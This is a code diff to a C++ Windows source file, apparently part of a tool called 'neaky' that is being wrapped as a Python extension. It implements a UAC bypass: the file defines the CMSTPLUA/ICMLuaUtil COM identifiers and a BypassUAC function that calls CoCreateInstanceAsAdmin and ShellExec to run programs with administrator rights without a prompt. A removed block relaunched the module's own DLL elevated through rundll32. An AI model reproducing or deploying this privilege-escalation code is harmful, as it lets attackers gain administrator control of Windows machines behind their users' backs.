@@ -1,6 +1,5 @@
 #define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
 // Windows 头文件
-#define UNICODE
 #include <windows.h>
 #include <cstdio>
 #include <iostream>
@@ -10,8 +9,11 @@
 #include <strsafe.h>
 
 #include "uac_bypass.h"
-#include "dllmain.h"
-#include "runtime/utils.h"
+#include <neaky/utils.h>
+
+#define PY_SSIZE_T_CLEAN
+#include <Python.h>
+#include "../neakymodule.h"
 
 #define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
 #define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
@@ -154,12 +156,14 @@ BOOL BypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
 		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
 		if (FAILED(hr))
 		{
+			PyErr_SetString(NeakyError, "CoCreateInstanceAsAdmin failed.");
 			break;
 		}
 
 		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, parameter, NULL, 0, SW_SHOW);
 		if (FAILED(hr))
 		{
+			PyErr_SetString(NeakyError, "CMLuaUtil->lpVtbl->ShellExec failed.");
 			break;
 		}
 		bRet = TRUE;
@@ -172,11 +176,4 @@ BOOL BypassUAC(LPCWSTR lpwszExecutable, LPCWSTR parameter)
 	return bRet;
 }
 
-// 通过提权的方法再调用一份提升权限后的本dll。
-BOOL BypassUAC(LPCWSTR self_cmd)
-{
-	wchar_t* p = lstrcat_heap(module_path, L",EntryPoint ");
-	LPWSTR parameter = lstrcat_heap(p, self_cmd);
-	return BypassUAC(L"C:\\Windows\\System32\\rundll32.exe", parameter);
-}
 
